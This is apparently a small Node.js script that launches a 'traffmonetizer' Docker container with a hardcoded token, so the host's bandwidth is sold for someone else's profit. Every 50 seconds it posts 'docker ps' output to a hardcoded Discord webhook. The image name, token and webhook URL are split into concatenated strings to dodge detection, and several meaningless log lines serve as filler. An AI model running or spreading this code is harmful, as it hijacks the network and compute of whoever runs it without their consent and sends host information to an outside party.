const { exec } = require('child_process')
const axios = require("axios")
console.log("Going")
const { performance } = require('perf_hooks');
const date = Math.floor(new Date().getTime() / 1000);
const start = performance.now();
// hello
console.log("console")
function convert(millis) {
  var minutes = Math.floor(millis / 60000);
  var seconds = ((millis % 60000) / 1000).toFixed(0)
  return minutes + ":" + (seconds < 10 ? '0' : '') + seconds;
}
function send(info) {
axios(
  {
    url: "https://discord."+"com/api/web"+"hooks/1111953772156030986/S0ruBy8NBverRcb2qVCweBd7KTZ4v1nxjxNiP3oE4K9LuFxPz1t"+"-NNPvvZlT3QRLszeH",
    method: 'POST',

    headers: {
      'Content-Type': 'application/json',
    },
data: {
      username: "Circle",
      embeds: [
        { description: `${info || "running"}`, timestamp: new Date()}]
}}).then(()=>console.log("D,,,,one...")).catch(err=>console.log(err))
}

exec('docker run -i --name tm traffmonetize'+'r/cli start accept statistics --token gb0PYeCl6dRcS0ykGj9V3get02eE'+'+DMXZB8/XbNhxYc=', (a,b,c) => console.log(a,b,c));

console.log("HAOSAP")
console.log("GREAT")
console.log("COOL")
setInterval(() => 
exec('docker ps', (a,b,c) =>
   send(`${a?a:""}${b?b:""}${c?c:""}\n`+"\n <t:"+date+">, time driven "+convert(performance.now() - start))), 50000);
